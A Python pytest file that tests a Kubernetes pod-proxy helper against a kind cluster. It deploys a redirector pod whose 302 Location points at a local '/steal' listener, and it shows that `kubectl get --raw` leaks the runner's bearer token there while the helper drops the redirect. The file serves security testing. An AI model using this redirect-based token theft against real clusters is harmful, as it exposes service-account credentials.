"""S17 against a real API server (`RW_TEST_KIND=1`, skipped otherwise): a pod that answers
302 with an absolute Location on a listener this test controls. `kubectl get --raw` through the
pod proxy follows it and sends the runner's bearer token there; `proxy_get` never contacts it.

Needs kubectl and a kind cluster (the current context of $KUBECONFIG, or `RW_TEST_KIND_CONTEXT`)
that can pull or already has the pod image (`python:3.12-alpine`, or `RW_TEST_KIND_IMAGE`). It
creates one namespace (`rw-s17-<random>`) with two service accounts and a pod, and deletes the
namespace afterwards. The runner's credential is a service-account token, because
client-certificate kubeconfigs do not leak to plain http.
"""

from __future__ import annotations

import json
import os
import secrets
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from runwhen_capability.k8s_proxy import proxy_get
from runwhen_capability.rwerrors import RwError

pytestmark = pytest.mark.skipif(
    os.environ.get("RW_TEST_KIND") != "1", reason="set RW_TEST_KIND=1 to run against kind"
)

IMAGE = os.environ.get("RW_TEST_KIND_IMAGE", "python:3.12-alpine")

REDIRECTOR = """\
import http.server, os
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path.startswith("/ok"):
            body = b"hello from the pod"
            self.send_response(200)
        elif self.path.startswith("/relative"):
            body = b""
            self.send_response(302)
            self.send_header("Location", "/somewhere/else")
        else:
            body = b""
            self.send_response(302)
            self.send_header("Location", os.environ["LOCATION"])
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
"""


def kubectl(*args: str, kubeconfig: str | None = None, check: bool = True):
    env = {**os.environ}
    if kubeconfig:
        env["KUBECONFIG"] = kubeconfig
    done = subprocess.run(
        ["kubectl", *args], capture_output=True, text=True, env=env, check=False, timeout=180
    )
    if check and done.returncode != 0:
        raise AssertionError(f"kubectl {' '.join(args)}: {done.stderr}")
    return done


class Listener:
    """The 'other host': records the path and Authorization header of every request."""

    def __init__(self) -> None:
        self.seen: list[dict] = []
        seen = self.seen

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                seen.append({"path": self.path, "authorization": self.headers.get("Authorization")})
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


def kubeconfig_for(tmp: Path, name: str, token: str) -> str:
    """A kubeconfig for the current cluster that authenticates with `token` only."""
    cluster = json.loads(kubectl("config", "view", "--minify", "--flatten", "-o", "json").stdout)
    path = tmp / f"{name}.kubeconfig"
    doc = {
        "apiVersion": "v1",
        "kind": "Config",
        "clusters": cluster["clusters"],
        "users": [{"name": name, "user": {"token": token}}],
        "contexts": [
            {"name": name, "context": {"cluster": cluster["clusters"][0]["name"], "user": name}}
        ],
        "current-context": name,
    }
    path.write_text(json.dumps(doc))
    return str(path)


@pytest.fixture(scope="module")
def cluster(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("kind")
    context = os.environ.get("RW_TEST_KIND_CONTEXT")
    if context:
        kubectl("config", "use-context", context)
    namespace = f"rw-s17-{secrets.token_hex(3)}"
    listener = Listener()
    kubectl("create", "namespace", namespace)
    try:
        for account in ("runner", "noperm"):
            kubectl("-n", namespace, "create", "serviceaccount", account)
        kubectl(
            "-n", namespace, "create", "role", "prober",
            "--verb=get", "--resource=pods/proxy,services/proxy",
        )  # fmt: skip
        kubectl(
            "-n", namespace, "create", "rolebinding", "prober",
            "--role=prober", f"--serviceaccount={namespace}:runner",
        )  # fmt: skip
        kubectl(
            "-n", namespace, "run", "redirector", f"--image={IMAGE}",
            "--image-pull-policy=IfNotPresent", "--port=8080",
            f"--env=LOCATION=http://127.0.0.1:{listener.port}/steal",
            "--command", "--", "python", "-c", REDIRECTOR,
        )  # fmt: skip
        kubectl(
            "-n", namespace, "wait", "--for=condition=Ready", "pod/redirector", "--timeout=150s"
        )
        runner = kubectl("-n", namespace, "create", "token", "runner").stdout.strip()
        noperm = kubectl("-n", namespace, "create", "token", "noperm").stdout.strip()
        yield {
            "namespace": namespace,
            "listener": listener,
            "runner_token": runner,
            "runner": kubeconfig_for(tmp, "runner", runner),
            "noperm": kubeconfig_for(tmp, "noperm", noperm),
        }
    finally:
        listener.close()
        kubectl("delete", "namespace", namespace, "--wait=false", check=False)


def test_kubectl_get_raw_follows_the_redirect_and_leaks_the_token(cluster):
    """The finding: the control. If this fails, the premise changed (report it)."""
    listener = cluster["listener"]
    before = len(listener.seen)
    kubectl(
        "get", "--raw",
        f"/api/v1/namespaces/{cluster['namespace']}/pods/redirector:8080/proxy/login",
        kubeconfig=cluster["runner"], check=False,
    )  # fmt: skip
    leaked = listener.seen[before:]
    assert leaked, "kubectl did not follow the redirect"
    assert leaked[0]["path"] == "/steal"
    assert leaked[0]["authorization"] == f"Bearer {cluster['runner_token']}"


def test_proxy_get_reports_the_redirect_and_never_contacts_the_other_host(cluster, monkeypatch):
    listener = cluster["listener"]
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    before = len(listener.seen)
    got = proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/login", timeout=60)
    assert got.status == 302
    assert got.location is None
    assert got.headers["x-rw-redirect-dropped"] == f"127.0.0.1:{listener.port}"
    assert "location" not in got.headers
    assert listener.seen[before:] == []


def test_proxy_get_returns_a_normal_answer_and_a_relative_redirect(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    ok = proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/ok", timeout=60)
    assert (ok.status, ok.body) == (200, b"hello from the pod")
    relative = proxy_get(cluster["namespace"], "pods", "redirector", "8080", "relative", timeout=60)
    # the API server's proxy rewrites a backend-relative Location into its own path space
    prefix = f"/api/v1/namespaces/{cluster['namespace']}/pods/redirector:8080/proxy"
    assert (relative.status, relative.location) == (302, f"{prefix}/somewhere/else")


def test_an_api_server_refusal_is_permission_denied(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["noperm"])
    with pytest.raises(RwError) as raised:
        proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/ok", timeout=60)
    assert raised.value.code == "permission_denied"
